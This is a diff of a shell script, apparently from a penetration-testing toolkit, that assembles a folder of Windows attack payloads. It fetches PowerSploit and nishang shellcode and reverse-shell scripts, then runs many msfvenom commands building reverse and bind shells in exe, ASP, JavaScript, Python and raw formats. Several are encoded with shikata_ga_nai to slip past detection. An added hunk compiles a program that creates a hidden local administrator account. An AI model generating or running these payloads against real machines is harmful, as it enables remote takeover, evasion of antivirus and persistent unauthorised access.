@@ -1,78 +1,78 @@
 mkdir public/payloads_windows
 cd public/payloads_windows
 
-   wget -N https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
-   wget -N https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+    wget -N https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
+    wget -N https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
-   if [ ! -d "Simple Reverse Shell" ]; then
-      git clone --depth=1 --recursive https://github.com/infoskirmish/Window-Tools.git
-      mv Window-Tools/* .
-      rm -rf .git
-      rm -rf Window-Tools
-   fi
+    if [ ! -d "Simple Reverse Shell" ]; then
+        git clone --depth=1 --recursive https://github.com/infoskirmish/Window-Tools.git
+        mv Window-Tools/* .
+        rm -rf .git
+        rm -rf Window-Tools
+    fi
 
-   if [ ! -f shell_reverse_tcp_x86.exe ] || confirm "Regenerate payloads_windows [y/n]? " ; then
-      # Reverse shells
-      banner "payloads_windows: shell_reverse_tcp_*.exe"
-      msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -o shell_reverse_tcp_x86.exe
-      echo ""
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -o shell_reverse_tcp_x64.exe
+    if [ ! -f shell_reverse_tcp_x86.exe ] || confirm "Regenerate payloads_windows [y/n]? " ; then
+        # Reverse shells
+        banner "payloads_windows: shell_reverse_tcp_*.exe"
+        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -o shell_reverse_tcp_x86.exe
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -o shell_reverse_tcp_x64.exe
 
-      banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.exe"
-      msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
-      echo ""
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe
+        banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.exe"
+        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe
 
-      banner "payloads_windows: shell_reverse_tcp_*.asp"
-      msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x86.asp
-      echo ""
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp
+        banner "payloads_windows: shell_reverse_tcp_*.asp"
+        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x86.asp
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp
 
-      banner "payloads_windows: shell_reverse_tcp_*.js_le"
-      msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
-      echo ""
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x64.js_le
+        banner "payloads_windows: shell_reverse_tcp_*.js_le"
+        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x64.js_le
 
-      banner "payloads_windows: shell_reverse_tcp_*.python"
-      msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x86.python
-      echo ""
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x64.python
+        banner "payloads_windows: shell_reverse_tcp_*.python"
+        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x86.python
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x64.python
 
-      banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.bin"
-      msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --format raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
-      echo ""
-      msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --format raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin    
-         
-      # Bind shells
-      banner "payloads_windows: shell_reverse_tcp_*.exe"
-      msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -o shell_bind_tcp_x86.exe
-      echo ""
-      msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -o shell_bind_tcp_x64.exe
+        banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.bin"
+        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --format raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --format raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin    
+            
+        # Bind shells
+        banner "payloads_windows: shell_reverse_tcp_*.exe"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -o shell_bind_tcp_x86.exe
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -o shell_bind_tcp_x64.exe
 
-      banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.exe"
-      msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.exe
-      echo ""
-      msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.exe
+        banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.exe"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.exe
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.exe
 
-      banner "payloads_windows: shell_bind_tcp_*.asp"
-      msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x86.asp
-      echo ""
-      msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp
+        banner "payloads_windows: shell_bind_tcp_*.asp"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x86.asp
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp
 
-      banner "payloads_windows: shell_bind_tcp_*.js_le"
-      msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
-      echo ""
-      msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x64.js_le
+        banner "payloads_windows: shell_bind_tcp_*.js_le"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x64.js_le
 
-      banner "payloads_windows: shell_bind_tcp_*.python"
-      msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x86.python
-      echo ""
-      msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x64.python
+        banner "payloads_windows: shell_bind_tcp_*.python"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x86.python
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x64.python
 
-      banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.bin"
-      msfvenom -p windows/shell_bind_tcp LPORT=$remote_port --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
-      echo ""
-      msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin
+        banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.bin"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin
 
 
 banner "payloads_windows: asptest.asp.config"
@@ -212,8 +212,18 @@ Response.write(o)
 -->
 EOT
 
-      # Create all common shells in payloads_windows folder
-      bash ../../_setup/setup_payloads.sh
+banner "windows_linux: useradd.c"
+cat <<\EOT >useradd.c
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+int main () {
+int i;
+i=system ("net user brisksec brisksec /add & net localgroup administrators brisksec /add"); return 0;
+}
+EOT
+i686-w64-mingw32-gcc -o useradd.exe useradd.c
+
+        # Create all common shells in payloads_windows folder
+        bash ../../_setup/setup_payloads.sh
       
    fi
 
